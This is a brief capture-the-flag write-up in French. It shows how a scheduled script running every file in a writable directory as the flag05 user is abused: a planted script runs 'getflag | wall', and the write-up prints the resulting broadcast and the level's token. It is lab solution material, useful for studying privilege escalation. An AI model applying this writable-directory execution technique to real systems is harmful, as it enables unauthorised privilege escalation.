find / -user flag05
cat /usr/sbin/openarenaserver
#!/bin/sh

for i in c* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done


aucune difficulté à comprendre que n'importe quoi va etre executé depuis /opt/openarenaserver/


et vu qu'on a les permission d'écriture il suffit de faire un .sh dans /opt/openarenaserver/ avec 
#!/bin/bash

getflag | wall
pour broadcast le flag a tous les utilisateurs connectés

Broadcast Message from flag05@Snow                                             
        (somewhere) at 15:32 ...                                               
                                                                               
Check flag.Here is your token : viuaaale9huek52boumoomioc 